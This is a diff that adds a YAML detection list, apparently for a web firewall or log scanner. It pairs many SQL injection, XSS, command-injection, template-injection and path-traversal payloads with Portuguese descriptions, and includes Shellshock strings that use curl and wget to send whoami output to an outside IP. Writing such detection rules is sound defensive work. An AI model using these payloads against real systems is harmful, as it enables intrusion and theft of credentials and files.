@@ -1,0 +1,709 @@
+suspicious_patterns:
+- pattern: "<script>"
+  description: "Possível tentativa de injeção de script (XSS)"
+- pattern: "SELECT * FROM"
+  description: "Possível tentativa de SQL Injection"
+- pattern: "DROP TABLE"
+  description: "Tentativa de deletar tabelas no banco de dados"
+- pattern: "' OR 1=1"
+  description: "SQL Injection tentando obter todos os registros"
+- pattern: "../"
+  description: "Tentativa de Path Traversal"
+- pattern: "%00"
+  description: "Tentativa de NULL Byte Injection"
+- pattern: "sqlmap"
+  description: "Ferramenta de ataque SQLMap detectada"
+- pattern: "nmap"
+  description: "Varredura de portas com Nmap detectada"
+- pattern: "nikto"
+  description: "Ferramenta de varredura Nikto detectada"
+- pattern: "w3af"
+  description: "Ferramenta de teste de segurança w3af detectada"
+- pattern: "OR 1=1"
+  description: "SQL Injection tentando obter todos os registros"
+
+- pattern: "OR 1=0"
+  description: "SQL Injection com condição falsa"
+
+- pattern: "OR x=x"
+  description: "SQL Injection com comparação verdadeira"
+
+- pattern: "OR x=y"
+  description: "SQL Injection com comparação falsa"
+
+- pattern: "OR 1=1#"
+  description: "SQL Injection com comentário após condição verdadeira"
+
+- pattern: "OR 1=0#"
+  description: "SQL Injection com comentário após condição falsa"
+
+- pattern: "OR x=x#"
+  description: "SQL Injection com comentário após comparação verdadeira"
+
+- pattern: "OR x=y#"
+  description: "SQL Injection com comentário após comparação falsa"
+
+- pattern: "OR 1=1--"
+  description: "SQL Injection com comentário após condição verdadeira"
+
+- pattern: "OR 1=0--"
+  description: "SQL Injection com comentário após condição falsa"
+
+- pattern: "OR x=x--"
+  description: "SQL Injection com comentário após comparação verdadeira"
+
+- pattern: "OR x=y--"
+  description: "SQL Injection com comentário após comparação falsa"
+
+- pattern: "OR 3409=3409 AND ('pytW' LIKE 'pytW')"
+  description: "SQL Injection com comparação e LIKE"
+
+- pattern: "OR 3409=3409 AND ('pytW' LIKE 'pytY')"
+  description: "SQL Injection com comparação e LIKE"
+
+- pattern: "HAVING 1=1"
+  description: "SQL Injection com HAVING e condição verdadeira"
+
+- pattern: "HAVING 1=0"
+  description: "SQL Injection com HAVING e condição falsa"
+
+- pattern: "HAVING 1=1#"
+  description: "SQL Injection com HAVING e comentário após condição verdadeira"
+
+- pattern: "HAVING 1=0#"
+  description: "SQL Injection com HAVING e comentário após condição falsa"
+
+- pattern: "HAVING 1=1--"
+  description: "SQL Injection com HAVING e comentário após condição verdadeira"
+
+- pattern: "HAVING 1=0--"
+  description: "SQL Injection com HAVING e comentário após condição falsa"
+
+- pattern: "AND 1=1"
+  description: "SQL Injection com AND e condição verdadeira"
+
+- pattern: "AND 1=0"
+  description: "SQL Injection com AND e condição falsa"
+
+- pattern: "AND 1=1--"
+  description: "SQL Injection com AND e comentário após condição verdadeira"
+
+- pattern: "AND 1=0--"
+  description: "SQL Injection com AND e comentário após condição falsa"
+
+- pattern: "AND 1=1#"
+  description: "SQL Injection com AND e comentário após condição verdadeira"
+
+- pattern: "AND 1=0#"
+  description: "SQL Injection com AND e comentário após condição falsa"
+
+- pattern: "AND 1=1 AND '%'='"
+  description: "SQL Injection com AND e comparação falsa"
+
+- pattern: "AND 1=0 AND '%'='"
+  description: "SQL Injection com AND e comparação falsa"
+
+- pattern: "AND 1083=1083 AND (1427=1427)"
+  description: "SQL Injection com múltiplas condições e comparação verdadeira"
+
+- pattern: "AND 7506=9091 AND (5913=5913)"
+  description: "SQL Injection com múltiplas condições e comparação verdadeira"
+
+- pattern: "AND 1083=1083 AND ('1427=1427')"
+  description: "SQL Injection com múltiplas condições e comparação verdadeira"
+
+- pattern: "AND 7506=9091 AND ('5913=5913')"
+  description: "SQL Injection com múltiplas condições e comparação verdadeira"
+
+- pattern: "AND 7300=7300 AND 'pKlZ'='pKlZ'"
+  description: "SQL Injection com condição AND e comparação verdadeira"
+
+- pattern: "AND 7300=7300 AND 'pKlZ'='pKlY'"
+  description: "SQL Injection com condição AND e comparação falsa"
+
+- pattern: "AND 7300=7300 AND ('pKlZ'='pKlZ')"
+  description: "SQL Injection com condição AND e comparação verdadeira"
+
+- pattern: "AND 7300=7300 AND ('pKlZ'='pKlY')"
+  description: "SQL Injection com condição AND e comparação falsa"
+
+- pattern: "AS INJECTX WHERE 1=1 AND 1=1"
+  description: "SQL Injection com INJECTX e condição verdadeira"
+
+- pattern: "AS INJECTX WHERE 1=1 AND 1=0"
+  description: "SQL Injection com INJECTX e condição falsa"
+
+- pattern: "AS INJECTX WHERE 1=1 AND 1=1#"
+  description: "SQL Injection com INJECTX e comentário após condição verdadeira"
+
+- pattern: "AS INJECTX WHERE 1=1 AND 1=0#"
+  description: "SQL Injection com INJECTX e comentário após condição falsa"
+
+- pattern: "AS INJECTX WHERE 1=1 AND 1=1--"
+  description: "SQL Injection com INJECTX e comentário após condição verdadeira"
+
+- pattern: "AS INJECTX WHERE 1=1 AND 1=0--"
+  description: "SQL Injection com INJECTX e comentário após condição falsa"
+
+- pattern: "WHERE 1=1 AND 1=1"
+  description: "SQL Injection com WHERE e condição verdadeira"
+
+- pattern: "WHERE 1=1 AND 1=0"
+  description: "SQL Injection com WHERE e condição falsa"
+
+- pattern: "WHERE 1=1 AND 1=1#"
+  description: "SQL Injection com WHERE e comentário após condição verdadeira"
+
+- pattern: "WHERE 1=1 AND 1=0#"
+  description: "SQL Injection com WHERE e comentário após condição falsa"
+
+- pattern: "WHERE 1=1 AND 1=1--"
+  description: "SQL Injection com WHERE e comentário após condição verdadeira"
+
+- pattern: "WHERE 1=1 AND 1=0--"
+  description: "SQL Injection com WHERE e comentário após condição falsa"
+
+- pattern: "ORDER BY 1--"
+  description: "SQL Injection com ORDER BY e coluna 1"
+
+- pattern: "ORDER BY 2--"
+  description: "SQL Injection com ORDER BY e coluna 2"
+
+- pattern: "ORDER BY 3--"
+  description: "SQL Injection com ORDER BY e coluna 3"
+
+- pattern: "ORDER BY 4--"
+  description: "SQL Injection com ORDER BY e coluna 4"
+
+- pattern: "ORDER BY 5--"
+  description: "SQL Injection com ORDER BY e coluna 5"
+
+- pattern: "ORDER BY 6--"
+  description: "SQL Injection com ORDER BY e coluna 6"
+
+- pattern: "ORDER BY 7--"
+  description: "SQL Injection com ORDER BY e coluna 7"
+
+- pattern: "ORDER BY 8--"
+  description: "SQL Injection com ORDER BY e coluna 8"
+
+- pattern: "ORDER BY 9--"
+  description: "SQL Injection com ORDER BY e coluna 9"
+
+- pattern: "ORDER BY 30--"
+  description: "SQL Injection com ORDER BY e coluna 30"
+
+- pattern: "ORDER BY 31337--"
+  description: "SQL Injection com ORDER BY e coluna 31337"
+
+- pattern: "ORDER BY 1#"
+  description: "SQL Injection com ORDER BY e coluna 1"
+
+- pattern: "ORDER BY 2#"
+  description: "SQL Injection com ORDER BY e coluna 2"
+
+- pattern: "ORDER BY 3#"
+  description: "SQL Injection com ORDER BY e coluna 3"
+
+- pattern: "ORDER BY 4#"
+  description: "SQL Injection com ORDER BY e coluna 4"
+
+- pattern: "ORDER BY 5#"
+  description: "SQL Injection com ORDER BY e coluna 5"
+
+- pattern: "ORDER BY 6#"
+  description: "SQL Injection com ORDER BY e coluna 6"
+
+- pattern: "ORDER BY 7#"
+  description: "SQL Injection com ORDER BY e coluna 7"
+
+- pattern: "ORDER BY 8#"
+  description: "SQL Injection com ORDER BY e coluna 8"
+
+- pattern: "ORDER BY 9#"
+  description: "SQL Injection com ORDER BY e coluna 9"
+
+- pattern: "ORDER BY 10#"
+  description: "SQL Injection com ORDER BY e coluna 10"
+
+- pattern: "ORDER BY 11#"
+  description: "SQL Injection com ORDER BY e coluna 11"
+
+- pattern: "ORDER BY 12#"
+  description: "SQL Injection com ORDER BY e coluna 12"
+
+- pattern: "ORDER BY 13#"
+  description: "SQL Injection com ORDER BY e coluna 13"
+
+- pattern: "ORDER BY 14#"
+  description: "SQL Injection com ORDER BY e coluna 14"
+
+- pattern: "ORDER BY 15#"
+  description: "SQL Injection com ORDER BY e coluna 15"
+
+- pattern: "ORDER BY 16#"
+  description: "SQL Injection com ORDER BY e coluna 16"
+
+- pattern: "ORDER BY 17#"
+  description: "SQL Injection com ORDER BY e coluna 17"
+
+- pattern: "ORDER BY 18#"
+  description: "SQL Injection com ORDER BY e coluna 18"
+
+- pattern: "ORDER BY 19#"
+  description: "SQL Injection com ORDER BY e coluna 19"
+
+- pattern: "ORDER BY 20#"
+  description: "SQL Injection com ORDER BY e coluna 20"
+
+- pattern: "ORDER BY 21#"
+  description: "SQL Injection com ORDER BY e coluna 21"
+
+- pattern: "ORDER BY 22#"
+  description: "SQL Injection com ORDER BY e coluna 22"
+
+- pattern: "ORDER BY 23#"
+  description: "SQL Injection com ORDER BY e coluna 23"
+
+- pattern: "ORDER BY 24#"
+  description: "SQL Injection com ORDER BY e coluna 24"
+
+- pattern: "ORDER BY 25#"
+  description: "SQL Injection com ORDER BY e coluna 25"
+
+- pattern: "ORDER BY 26#"
+  description: "SQL Injection com ORDER BY e coluna 26"
+
+- pattern: "ORDER BY 27#"
+  description: "SQL Injection com ORDER BY e coluna 27"
+
+- pattern: "ORDER BY 28#"
+  description: "SQL Injection com ORDER BY e coluna 28"
+
+- pattern: "ORDER BY 29#"
+  description: "SQL Injection com ORDER BY e coluna 29"
+
+- pattern: "ORDER BY 30#"
+  description: "SQL Injection com ORDER BY e coluna 30"
+
+- pattern: "ORDER BY 31337#"
+  description: "SQL Injection com ORDER BY e coluna 31337"
+
+- pattern: "ORDER BY 31337"
+  description: "SQL Injection com ORDER BY e coluna 31337"
+
+- pattern: "RLENGTH (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='"
+  description: "SQL Injection usando RLIKE"
+
+- pattern: "RLENGTH (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='"
+  description: "SQL Injection com comparação usando RLIKE"
+
+- pattern: "IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--"
+  description: "SQL Injection com condição IF"
+
+- pattern: "IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--"
+  description: "SQL Injection com condição IF verdadeira"
+
+- pattern: "%' AND 8310=8310 AND '%'='"
+  description: "SQL Injection com AND e comparação verdadeira"
+
+- pattern: "%' AND 8310=8311 AND '%'='"
+  description: "SQL Injection com AND e comparação falsa"
+
+- pattern: "and (select substring(@@version,1,1))='X'"
+  description: "SQL Injection verificando a versão do banco"
+
+- pattern: "and (select substring(@@version,1,1))='M'"
+  description: "SQL Injection verificando a versão do banco"
+
+- pattern: "and (select substring(@@version,2,1))='i'"
+  description: "SQL Injection verificando a versão do banco"
+
+- pattern: "and (select substring(@@version,2,1))='y'"
+  description: "SQL Injection verificando a versão do banco"
+
+- pattern: "and (select substring(@@version,3,1))='c'"
+  description: "SQL Injection verificando a versão do banco"
+
+- pattern: "and (select substring(@@version,3,1))='S'"
+  description: "SQL Injection verificando a versão do banco"
+
+- pattern: "and (select substring(@@version,3,1))='X'"
+  description: "SQL Injection verificando a versão do banco"
+- pattern: "-prompt(8)-"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "'-prompt(8)-'"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "\";a=prompt,a()//"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "';a=prompt,a()//"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "-eval(\"window \")-"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "\"-eval(\"window \")-\""
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "\"onclick=prompt(8)>\"@x.y"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "\"onclick=prompt(8)><svg/onload=prompt(8)>\"@x.y"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<image/src/onerror=prompt(8)>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<img/src/onerror=prompt(8)>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<image src/onerror=prompt(8)>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<img src/onerror=prompt(8)>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<image src =q onerror=prompt(8)>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<img src =q onerror=prompt(8)>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "</scrip</script>t><img src =q onerror=prompt(8)>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<script\x20type=\"text/javascript\">javascript:alert(1);</script>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<script\x3Etype=\"text/javascript\">javascript:alert(1);</script>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<script\x0Dtype=\"text/javascript\">javascript:alert(1);</script>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<script\x09type=\"text/javascript\">javascript:alert(1);</script>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<script\x0Ctype=\"text/javascript\">javascript:alert(1);</script>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<script\x2Ftype=\"text/javascript\">javascript:alert(1);</script>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<script\x0Atype=\"text/javascript\">javascript:alert(1);</script>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "'`\"><\x3Cscript>javascript:alert(1)</script>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "'`\"><\x00script>javascript:alert(1)</script>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<audio src=1 href=1 onerror=\"javascript:alert(1)\"></audio>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<video src=1 href=1 onerror=\"javascript:alert(1)\"></video>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<body src=1 href=1 onerror=\"javascript:alert(1)\"></body>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<image src=1 href=1 onerror=\"javascript:alert(1)\"></image>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<object src=1 href=1 onerror=\"javascript:alert(1)\"></object>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<script src=1 href=1 onerror=\"javascript:alert(1)\"></script>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<svg onResize svg onResize=\"javascript:javascript:alert(1)\"></svg onResize>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<title onPropertyChange title onPropertyChange=\"javascript:javascript:alert(1)\"></title onPropertyChange>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<iframe onLoad iframe onLoad=\"javascript:javascript:alert(1)\"></iframe onLoad>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<body onMouseEnter body onMouseEnter=\"javascript:javascript:alert(1)\"></body onMouseEnter>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<body onFocus body onFocus=\"javascript:javascript:alert(1)\"></body onFocus>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<frameset onScroll frameset onScroll=\"javascript:javascript:alert(1)\"></frameset onScroll>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<script onReadyStateChange script onReadyStateChange=\"javascript:javascript:alert(1)\"></script onReadyStateChange>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<html onMouseUp html onMouseUp=\"javascript:javascript:alert(1)\"></html onMouseUp>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<body onPropertyChange body onPropertyChange=\"javascript:javascript:alert(1)\"></body onPropertyChange>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<svg onLoad svg onLoad=\"javascript:javascript:alert(1)\"></svg onLoad>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<body onPageHide body onPageHide=\"javascript:javascript:alert(1)\"></body onPageHide>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<body onMouseOver body onMouseOver=\"javascript:javascript:alert(1)\"></body onMouseOver>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<body onUnload body onUnload=\"javascript:javascript:alert(1)\"></body onUnload>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<body onLoad body onLoad=\"javascript:javascript:alert(1)\"></body onLoad>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<bgsound onPropertyChange bgsound onPropertyChange=\"javascript:javascript:alert(1)\"></bgsound onPropertyChange>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<html onMouseLeave html onMouseLeave=\"javascript:javascript:alert(1)\"></html onMouseLeave>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<html onMouseWheel html onMouseWheel=\"javascript:javascript:alert(1)\"></html onMouseWheel>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<style onLoad style onLoad=\"javascript:javascript:alert(1)\"></style onLoad>"
+  description: "Possível tentativa de injeção de script (XSS)"
+
+- pattern: "<iframe onReadyStateChange iframe onReadyStateChange=\"javascript:javascript:alert(1)\"></iframe onReadyStateChange>"
+  description: "Possível tentativa de injeção de script (XSS)"
+- pattern: "<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>"
+  description: "Possível tentativa de XSS bypassando firewall"
+- pattern: "<script>alert(1)</script>"
+  description: "Tentativa de XSS"
+- pattern: "{{7 * 7}}"
+  description: "Tenttiva de SSTI"
+- pattern: "%7B%7B7%20%2A%207%7D%7D"
+  description: "Tentativa de SSTI"
+- pattern: "/usr/bin/id  |/bin/ls -al"
+  description: "Possível tentativa de execução remota de comandos (RCE)"
+- pattern: "a);/usr/bin/id"
+  description: "Possível tentativa de execução remota de comandos (RCE)"
+- pattern: "a;/usr/bin/id"
+  description: "Possível tentativa de execução remota de comandos (RCE)"
+- pattern: "a);/usr/bin/id;"
+  description: "Possível tentativa de execução remota de comandos (RCE)"
+- pattern: "a;/usr/bin/id;"
+  description: "Possível tentativa de execução remota de comandos (RCE)"
+- pattern: "a);/usr/bin/id|"
+  description: "Possível tentativa de execução remota de comandos (RCE)"
+- pattern: "a;/usr/bin/id|"
+  description: "Possível tentativa de execução remota de comandos (RCE)"
+- pattern: "a)|/usr/bin/id"
+  description: "Possível tentativa de execução remota de comandos (RCE)"
+- pattern: "a|/usr/bin/id"
+  description: "Possível tentativa de execução remota de comandos (RCE)"
+- pattern: "a)|/usr/bin/id;"
+  description: "Possível tentativa de execução remota de comandos (RCE)"
+- pattern: "a|/usr/bin/id"
+  description: "Possível tentativa de execução remota de comandos (RCE)"
+- pattern: "system('cat%20/etc/passwd')"
+  description: "Possível tentativa de leitura de arquivo sensível (RCE)"
+- pattern: "system('id')"
+  description: "Possível tentativa de execução remota de comandos (RCE)"
+- pattern: "system('/usr/bin/id')"
+  description: "Possível tentativa de execução remota de comandos (RCE)"
+- pattern: "%0Acat%20/etc/passwd"
+  description: "Possível tentativa de leitura de arquivo sensível (RCE)"
+- pattern: "%0A/usr/bin/id"
+  description: "Possível tentativa de execução remota de comandos (RCE)"
+- pattern: "%0Aid"
+  description: "Possível tentativa de execução remota de comandos (RCE)"
+- pattern: "%0A/usr/bin/id%0A"
+  description: "Possível tentativa de execução remota de comandos (RCE)"
+- pattern: "%0Aid%0A"
+  description: "Possível tentativa de execução remota de comandos (RCE)"
+- pattern: "& ping -i 30 127.0.0.1 &"
+  description: "Possível tentativa de ataque de negação de serviço (DoS)"
+- pattern: "& ping -n 30 127.0.0.1 &"
+  description: "Possível tentativa de ataque de negação de serviço (DoS)"
+- pattern: "%0a ping -i 30 127.0.0.1 %0a"
+  description: "Possível tentativa de ataque de negação de serviço (DoS)"
+- pattern: "`ping 127.0.0.1`"
+  description: "Possível tentativa de execução remota de comandos (RCE)"
+- pattern: "| id"
+  description: "Possível tentativa de execução remota de comandos (RCE)"
+- pattern: "& id"
+  description: "Possível tentativa de execução remota de comandos (RCE)"
+- pattern: "; id"
+  description: "Possível tentativa de execução remota de comandos (RCE)"
+- pattern: "%0a id %0a"
+  description: "Possível tentativa de execução remota de comandos (RCE)"
+- pattern: "`id`"
+  description: "Possível tentativa de execução remota de comandos (RCE)"
+- pattern: "$;/usr/bin/id"
+  description: "Possível tentativa de execução remota de comandos (RCE)"
+- pattern: "() { :;}; /bin/bash -c 'curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=`whoami`'"
+  description: "Possível exploração da vulnerabilidade Shellshock"
+- pattern: "() { :;}; /bin/bash -c 'wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=`whoami`'"
+  description: "Possível exploração da vulnerabilidade Shellshock"
+- pattern: "cat /etc/hosts"
+  description: "Possível tentativa de leitura de arquivo sensível"
+- pattern: "$(`cat /etc/passwd`)"
+  description: "Possível tentativa de leitura de arquivo sensível"
+- pattern: "cat /etc/passwd"
+  description: "Possível tentativa de leitura de arquivo sensível"
+- pattern: "%0Acat%20/etc/passwd"
+  description: "Possível tentativa de leitura de arquivo sensível"
+- pattern: "{{ get_user_file('/etc/passwd') }}"
+  description: "Possível tentativa de leitura de arquivo sensível via template injection"
+- pattern: "<!--#exec cmd='/bin/cat /etc/passwd'-->"
+  description: "Possível tentativa de leitura de arquivo sensível via Server Side Includes (SSI)"
+- pattern: "system('cat /etc/passwd');"
+  description: "Possível tentativa de execução remota de comandos"
+- pattern: "<?php system('cat /etc/passwd');?>"
+  description: "Possível tentativa de execução remota de comandos via PHP"
+- pattern: "%3Cimage%2Fsrc%2Fonerror%3Dprompt%288%29%3E"
+  description: "Possível tentativa de injeção de script (XSS)"
+- pattern: "%3Cimg%2Fsrc%2Fonerror%3Dprompt%288%29%3E"
+  description: "Possível tentativa de injeção de script (XSS)"
+- pattern: "%3Cimage%20src%2Fonerror%3Dprompt%288%29%3E"
+  description: "Possível tentativa de injeção de script (XSS)"
+- pattern: "%3Cimg%20src%2Fonerror%3Dprompt%288%29%3E"
+  description: "Possível tentativa de injeção de script (XSS)"
+- pattern: "%3Cimage%20src%20%3Dq%20onerror%3Dprompt%288%29%3E"
+  description: "Possível tentativa de injeção de script (XSS)"
+- pattern: "%3Cimg%20src%20%3Dq%20onerror%3Dprompt%288%29%3E"
+  description: "Possível tentativa de injeção de script (XSS)"
+- pattern: "%3C%2Fscrip%3C%2Fscript%3Et%3E%3Cimg%20src%20%3Dq%20onerror%3Dprompt%288%29%3E"
+  description: "Possível tentativa de injeção de script (XSS)"
+- pattern: "%3Cscript%5Cx20type%3D%22text%2Fjavascript%22%3Ejavascript%3Aalert%281%29%3B%3C%2Fscript%3E"
+  description: "Possível tentativa de injeção de script (XSS)"
+- pattern: "%3Cscript%5Cx3Etype%3D%22text%2Fjavascript%22%3Ejavascript%3Aalert%281%29%3B%3C%2Fscript%3E"
+  description: "Possível tentativa de injeção de script (XSS)"
+- pattern: "%3Cscript%5Cx0Dtype%3D%22text%2Fjavascript%22%3Ejavascript%3Aalert%281%29%3B%3C%2Fscript%3E"
+  description: "Possível tentativa de injeção de script (XSS)"
+- pattern: "%3Cscript%5Cx09type%3D%22text%2Fjavascript%22%3Ejavascript%3Aalert%281%29%3B%3C%2Fscript%3E"
+  description: "Possível tentativa de injeção de script (XSS)"
+- pattern: "%3Cscript%5Cx0Ctype%3D%22text%2Fjavascript%22%3Ejavascript%3Aalert%281%29%3B%3C%2Fscript%3E"
+  description: "Possível tentativa de injeção de script (XSS)"
+- pattern: "%3Cscript%5Cx2Ftype%3D%22text%2Fjavascript%22%3Ejavascript%3Aalert%281%29%3B%3C%2Fscript%3E"
+  description: "Possível tentativa de injeção de script (XSS)"
+- pattern: "%3Cscript%5Cx0Atype%3D%22text%2Fjavascript%22%3Ejavascript%3Aalert%281%29%3B%3C%2Fscript%3E"
+  description: "Possível tentativa de injeção de script (XSS)"
+- pattern: "%27%60%22%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E"
+  description: "Possível tentativa de injeção de script (XSS)"
+- pattern: "%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%5Cx0D"
+  description: "Possível tentativa de injeção de script (XSS)"
+- pattern: "%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%5Cx0A"
+  description: "Possível tentativa de injeção de script (XSS)"
+- pattern: "%3Cscript%3Ejavascript%3Aalert%281%29%3C%2Fscript%5Cx0B"
+  description: "Possível tentativa de injeção de script (XSS)"
+- pattern: "%3Cscript%20charset%3D%5C%22%3Ejavascript%3Aalert%281%29%3C%2Fscript%3E"
+  description: "Possível tentativa de injeção de script (XSS)"
+- pattern: "%3C!--%5Cx3E%3Cimg%20src%3Dxxx%3Ax%20onerror%3Djavascript%3Aalert%281%29%3E%20--%3E"
+  description: "Possível tentativa de injeção de script (XSS)"
+- pattern: "%3C!--%3E%3Cimg%20src%3Dxxx%3Ax%20onerror%3Djavascript%3Aalert%281%29%3E%20--%3E"
+  description: "Possível tentativa de injeção de script (XSS)"
+- pattern: "%3C!--%20--%3E%20%3Cimg%20src%3Dxxx%3Ax%20onerror%3Djavascript%3Aalert%281%29%3E%20--%3E"
+  description: "Possível tentativa de injeção de script (XSS)"
+- pattern: "%60%22%27%3E%3Cimg%20src%3D%27%23%27%20onerror%3Djavascript%3Aalert%281%29%3E"
+  description: "Possível tentativa de injeção de script (XSS)"
+- pattern: "%3CA%20HRef%3D%2F%2FX55.is%20AutoFocus%20%2526%2523362%20OnFocus%250C%3Dimport%28href%29%3E"
+  description: "Possível tentativa de injeção de script (XSS)"
+- pattern: "{{7*7}}"
+  description: "Possível tentativa de exploração via SSTI em Jinja2"
+- pattern: "{{().__class__.__base__.__subclasses__()}}"
+  description: "Possível tentativa de exploração avançada via SSTI"
+- pattern: "${7*7}"
+  description: "Possível tentativa de SSTI em linguagens que suportam interpolação de string"
+- pattern: "${{7*7}}"
+  description: "Possível tentativa de SSTI em Jinja2/Flask"
+- pattern: "#{7*7}"
+  description: "Possível tentativa de SSTI em Ruby"
+- pattern: "<%= 7 * 7 %>"
+  description: "Possível tentativa de SSTI em ERB (Ruby on Rails)"
+- pattern: "{{config.items()}}"
+  description: "Possível tentativa de leitura da configuração do servidor via SSTI"
+- pattern: "{{request.application.__globals__}}"
+  description: "Possível tentativa de acessar variáveis globais via SSTI"
+- pattern: "{{self.__dict__}}"
+  description: "Possível tentativa de listar atributos do objeto atual via SSTI"
+- pattern: "{{().__class__.__mro__[1].__subclasses__()}}"
+  description: "Possível tentativa de SSTI para exploração avançada em Python"
+- pattern: "{{().__class__.__base__.__subclasses__()[40]('/etc/passwd').read()}}"
+  description: "Possível tentativa de leitura de arquivos via SSTI"
+- pattern: "{{[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()}}"
+  description: "Possível tentativa de exploração de SSTI para acessar arquivos sensíveis"
+- pattern: "{{request.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"
+  description: "Possível tentativa de acesso não autorizado a arquivos do sistema via SSTI"
+- pattern: "{{7*'7'}}"
+  description: "Possível tentativa de SSTI testando concatenação de strings"
+- pattern: "{{request.__class__.__mro__[2].__subclasses__()[59]('/etc/passwd').read()}}"
+  description: "Possível tentativa avançada de exploração via SSTI"
+- pattern: "{% print(7*7) %}"
+  description: "Possível tentativa de execução de código em um template engine"
+- pattern: "${{7*'7'}}"
+  description: "Possível tentativa de SSTI combinando strings e cálculos"
+- pattern: "${{request.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"
+  description: "Possível tentativa de SSTI para ler arquivos críticos do sistema"
+- pattern: "{{[].__class__.__base__.__subclasses__()}}"
+  description: "Possível tentativa de SSTI para exploração do ambiente"
+- pattern: "{{''.__class__.__mro__[1].__subclasses__()}}"
+  description: "Possível tentativa de SSTI para acesso não autorizado"
+- pattern: "{{request['application']['__globals__']}}"
+  description: "Possível tentativa de SSTI para acesso a variáveis do servidor"
+- pattern: "{{config.from_pyfile('/etc/passwd')}}"
+  description: "Possível tentativa de SSTI para leitura de arquivos sensíveis"
+- pattern: "../../etc/passwd"
+  description: "Possível tentativa de Local File Inclusion (LFI) para acessar arquivos do sistema"
+- pattern: "../../etc/shadow"
+  description: "Possível tentativa de LFI para acessar credenciais do sistema"
+- pattern: "../../etc/hosts"
+  description: "Possível tentativa de LFI para visualizar configurações de rede"
+- pattern: "../../etc/group"
+  description: "Possível tentativa de LFI para listar grupos de usuários do sistema"
+- pattern: "../../proc/self/environ"
+  description: "Possível tentativa de LFI para acessar variáveis de ambiente do sistema"
+- pattern: "../../proc/version"
+  description: "Possível tentativa de LFI para obter informações sobre a versão do sistema"
+- pattern: "../../proc/self/cmdline"
+  description: "Possível tentativa de LFI para acessar os argumentos de execução do processo"
+- pattern: "../../var/log/auth.log"
+  description: "Possível tentativa de LFI para acessar logs de autenticação"
+- pattern: "../../var/log/syslog"
+  description: "Possível tentativa de LFI para acessar logs do sistema"
+- pattern: "../../var/log/apache2/access.log"
+  description: "Possível tentativa de LFI para acessar logs de acesso do Apache"
+- pattern: "../../var/log/apache2/error.log"
+  description: "Possível tentativa de LFI para acessar logs de erro do Apache"
+- pattern: "../../var/log/nginx/access.log"
+  description: "Possível tentativa de LFI para acessar logs de acesso do Nginx"
+- pattern: "../../var/log/nginx/error.log"
